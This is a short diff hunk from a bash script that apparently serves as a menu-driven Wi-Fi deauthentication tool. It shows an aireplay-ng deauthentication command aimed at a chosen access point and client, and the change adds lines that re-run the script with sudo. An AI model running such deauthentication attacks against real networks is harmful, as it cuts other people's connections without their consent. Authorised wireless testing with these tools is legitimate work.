@@ -45,10 +45,12 @@ do
 	read 'p'
 
 	sudo aireplay-ng -0 $p -a $bssid -c $mac "$iface"mon;sudo airmon-ng stop "$iface"mon
+	sudo ./deauth
 	x=1	
 	;;
 	2)
 	sudo airmon-ng stop "$iface"mon
+	sudo ./deauth
 	sleep 2
 	x=1
 	;;
